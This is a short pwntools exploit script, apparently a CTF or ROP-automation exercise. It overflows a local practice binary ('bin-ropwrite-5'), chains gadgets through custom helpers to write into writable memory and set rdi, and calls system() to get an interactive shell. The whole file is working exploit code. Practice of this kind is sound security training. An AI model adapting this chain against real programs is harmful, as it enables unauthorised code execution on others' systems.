import Fart_ROP
from pwn import *
from analyze import *

binary = './bins2/bin-ropwrite-5'

anal = Analyze(binary)
f_rop = Fart_ROP.ROP(anal)


chain = b'A' * f_rop.offset
#chain += rop.fill_reg('r8', writeable_mem)
#chain += rop.fill_reg('rax', '/bin/sh\0')
#chain += rop.get_primitives()

chain += f_rop.do_the_thing()
chain += p64(0) # r15
#chain += p64(0) # r15


chain += f_rop.fill_reg('rdi', f_rop.get_writeable_mem())
chain += f_rop.realign()
chain += p64(anal.elf.sym['system'])

io = process(binary)
io.sendline(chain)
io.interactive()
